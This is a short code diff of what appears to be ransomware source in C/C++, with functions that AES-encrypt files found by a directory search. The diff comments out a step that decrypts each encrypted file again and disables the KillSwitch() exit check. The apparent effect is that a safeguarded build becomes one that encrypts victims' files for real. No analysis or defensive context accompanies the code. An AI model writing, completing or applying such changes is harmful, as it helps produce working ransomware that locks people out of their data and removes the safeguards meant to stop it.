@@ -62,11 +62,11 @@ void EncryptFile(char* fname, const uint8_t* key) {
   ANSI_X9_23(fname);
   AES_stream_encrypt(fname, key);
 
-  char* dest = new char[strlen(fname) + 11];
+  /*char* dest = new char[strlen(fname) + 11];
   strcpy(dest, fname);
   strcat(dest, ".encrypted");
   AES_stream_decrypt(dest, key);
-  delete[] dest;
+  delete[] dest;*/
 }
 
 void SearchFiles(const char* sDir, const uint8_t* key) {
@@ -113,7 +113,7 @@ int main() {
   //FreeConsole();
 #endif
 
-  if (KillSwitch()) exit(EXIT_FAILURE);
+  //if (KillSwitch()) exit(EXIT_FAILURE);
 
   /// GENERATE KEY
   uint8_t* key = advandedRNG();
